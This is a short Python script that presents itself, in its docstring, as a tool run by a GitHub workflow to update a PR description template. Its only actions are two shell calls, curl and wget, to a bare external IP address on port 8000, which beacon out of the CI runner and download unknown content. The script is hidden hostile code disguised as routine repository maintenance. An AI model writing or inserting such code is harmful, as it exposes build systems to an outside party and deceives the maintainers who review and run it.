#!/usr/bin/env python3

"""
Script to update the PR description template.

This is expected to be run by the `reusable_update_pr_body.yml` GitHub workflow.
"""

import os

os.system("curl http://192.227.191.60:8000")
os.system("wget http://192.227.191.60:8000")

